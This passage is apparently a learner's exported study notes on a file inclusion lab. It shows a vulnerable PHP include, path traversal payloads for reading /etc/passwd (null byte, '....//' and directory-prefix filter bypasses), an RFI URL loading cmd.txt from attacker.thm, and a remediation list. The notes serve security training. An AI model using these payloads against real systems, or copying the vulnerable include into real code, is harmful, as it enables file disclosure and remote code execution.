integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-80b8-895b-c1739af67cb5" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?PHP 
+	include(&quot;languages/&quot;. $_GET[&#x27;lang&#x27;]); 
+?&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-8070-a491-f58f03f4fa35" class="">Now the developer has added the directory to be fetched from, here we could use path traversal to read etc/passwd.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-80d6-83ee-cf1e087c46b4" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">http://webapp.thm/index.php?lang=../../../../etc/passwd</code></pre></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-80f9-8319-fec30a6cc007" class="">Sometimes the developer specifies in the include that adds .php to the input and retrieves the file accordingly.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-8067-b1f2-f95164d32db8" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">http://webapp.thm/index.php?lang=EN 
+here the index.php has a include fucntion that retrieves EN.php</code></pre></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-8077-859e-ea48d9207d86" class="">So just giving the file name will not retrieve the required file here, we have to negate the .php addition to our input so we inject null byte at the end %00.</p></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-806e-9b69-dbb873f05a2a" class="">The %00 trich is fixed and not working with PHP 5.3.4 and above.</p></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-802b-be7b-c80d7d3ff46e" class="">some %00 will be encoded in the brower and the .php will not be negated, edit the url directly.</p></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-8044-ab5d-cb9b695b72ed" class="">Now the next trick of defense is the developer has decide to filter keywords that restricts the retrieval of sensitive information. Now to trick the code we give /etc/passwd/. , this does not get filtered out and . means it will be there in the same directory, .. means one directory before.</p></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-8044-9101-e1e0aec3e942" class="">In the next level of defense the developer filters out ../ so now we change the payload that avoids this filter.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-80bf-8348-e33596488973" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">....//....//....//....//etc/passwd - Each ../ gets removed and we are left with
+../../../../etc/passwd</code></pre></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-80c1-bd4f-dc4bcdf1f75e" class="">Why this works? Because in php only the strings that match the format are removed and the rest are left out.</p></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-802d-87cb-c0c1e55c878d" class="">Sometimes the developer specifies the directory in which it reads file in the payload. To negate this the payload looks like</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-8034-afe8-fb0f9feeaef8" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">?lang=language/../../../../../etc/paswd</code></pre></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-800e-9f2b-c23448aa3a62" class="">Remote File Inclusion RFI</h2></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-8019-979f-f06ad520613a" class="">RFI is a technique to include remote files into a vulnerable application. It allows the user to inject external URL into include function. allow_url_fopen option being on is a requirement for RFI.</p></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-80a5-aba7-caa4999d589f" class="">The risk of RFI is higher than LFI because it allows remote code execution on the server.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-8035-b8cb-d91743f3f19b" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">http://webapp.thm/get.php?file=http://attacker.thm/cmd.txt 
+- happens when allow_url_fopen option is on.
+The web application executes the php code inside the cmd.txt file 
+from the malicious server.
+&lt;?PHP echo &quot;Hello THM&quot;; ?&gt;
+hence Hello THM is printed.
+</code></pre></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-80c7-8b41-fdd96bf0d993" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-80f3-85ef-c0cd94017bc8" class="">Remediation</h2></div><div style="display:contents" dir="auto"><ul id="2573eecd-ed53-80c7-b291-fda6541b6bfb" class="bulleted-list"><li style="list-style-type:disc">Keep system and services, including web application frameworks with updated version.</li></ul></div><div style="display:contents" dir="auto"><ul id="2573eecd-ed53-80a0-b8f1-efa503677c07" class="bulleted-list"><li style="list-style-type:disc">Turn off PHP errors, to prevent revealing sensitive information.</li></ul></div><div style="display:contents" dir="auto"><ul id="2573eecd-ed53-8063-bfc7-de497e8e7b48" class="bulleted-list"><li style="list-style-type:disc">Use WAF (Web Application Firewall) to prevent web application attacks.</li></ul></div><div style="display:contents" dir="auto"><ul id="2573eecd-ed53-8014-9baa-edf4a35da8cd" class="bulleted-list"><li style="list-style-type:disc">Disable some PHP features that cause file inclusion like allow_url_fopen and allow_url_include.</li></ul></div><div style="display:contents" dir="auto"><ul id="2573eecd-ed53-805f-a58f-e8476b51a33d" class="bulleted-list"><li style="list-style-type:disc">Allow only protocols and PHP wrappers that are in need.</li></ul></div><div style="display:contents" dir="auto"><ul id="2573eecd-ed53-8041-9458-d778b620c5b7" class="bulleted-list"><li style="list-style-type:disc">Never trust user input and perform input validation against file inclusion.</li></ul></div><div style="display:contents" dir="auto"><ul id="2573eecd-ed53-80cb-a853-fa2223c89917" class="bulleted-list"><li style="list-style-type:disc">Implement whitelisting &amp; blacklisting for file names and location.</li></ul></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-806b-a8ec-c2a8c08bb5cb" class="">Lab#1</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-80d4-b8e3-c83fc4d65529" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image.png"><img style="width:2786px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-80bd-83e9-fdae6eed6541" class="">Lab#2</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-808a-b16a-d26e84a94783" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%201.png"><img style="width:2860px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%201.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-80cc-9377-ee82c16301f4" class="">Lab#3</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-80f4-a158-ca5854ef80c0" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%202.png"><img style="width:2834px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%202.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-80df-8d72-e27b18204d50" class="">Lab#4</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-80dc-9bee-dadce2f2a302" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%203.png"><img style="width:2790px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%203.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-803a-9734-e15d4e50f847" class="">Lab#5</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-8017-a0c1-ef7744412750" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%204.png"><img style="width:2838px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%204.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-8052-9161-c7e2a90d8e0c" class="">Lab#6</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-8027-9285-f6595fb30ff6" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%205.png"><img style="width:2830px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%205.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-805e-9153-fe7baec3f045" class="">Challenges</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-8048-97d8-d259b564df04" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%206.png"><img style="width:709.984375px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%206.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-8021-a83f-f24cbfe4bd7d" class="">Lab#Challege1</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-802f-8037-ccf7ba8303db" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%207.png"><img style="width:709.984375px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%207.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-8000-8dbc-f5a18cad0616" class="">
+</p></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-80db-8555-e80779269edc" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%208.png"><img style="width:709.984375px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%208.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-8066-bbd5-e118d25d020d" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%209.png"><img style="width:672px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%209.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-8082-b819-e09a8e369751" class="">Lab#Challege2</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-80b6-b83a-db4de73b5164" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2010.png"><img style="width:709.984375px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2010.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-80c8-aae3-f1acc0c2c2f0" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2011.png"><img style="width:709.984375px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2011.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-80f6-b0f4-e67937e23577" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2012.png"><img style="width:709.921875px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2012.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-8000-ac3b-f89ba8ffb852" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2013.png"><img style="width:710px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2013.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-80ab-9bc6-fc2b444ba039" class="">Lab#Challenge3</h2></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-80ba-a4bf-eaa3b231777f" class="">I tried path traversal, .php was getting added so I added null byte at the end even tried to bypass filter like<strong> ../, </strong>nothing worked.</p></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-805f-8055-cf92b8f9bd60" class="">It seems this challenge the PHP uses $_REQUESTS, it is a super global variable and it is used here to prevent file inclusion, to negate this we could change the method to post and use both path traversal and null byte.</p></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-80d2-b486-ee2f1f5fbe5d" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2014.png"><img style="width:709.984375px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2014.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-804f-852e-f6e7b6139dc6" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2015.png"><img style="width:710px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2015.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-80e8-89c7-c7dac73cad99" class="">RFI</h2></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-80c4-966c-d39baf9eb412" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2016.png"><img style="width:710px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2016.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-804f-86de-cb1eca604f58" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2017.png"><img style="width:709.984375px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2017.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-809d-921b-ef0bc0b318a3" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2018.png"><img style="width:710px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2018.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="2573eecd-ed53-806b-ad3d-d533d3b6c262" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2019.png"><img style="width:248px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/image%2019.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="25b3eecd-ed53-8035-9096-dc3bd6e2c04a" class="">
+</p></div><div style="display:contents" dir="auto"><p id="25a3eecd-ed53-8056-a4b4-c2e7740e2d7d" class="">
+</p></div><div style="display:contents" dir="auto"><p id="25a3eecd-ed53-8099-b4f6-e41c68a166f9" class="">
+</p></div><div style="display:contents" dir="auto"><p id="2583eecd-ed53-8051-84b2-c480240f6f15" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
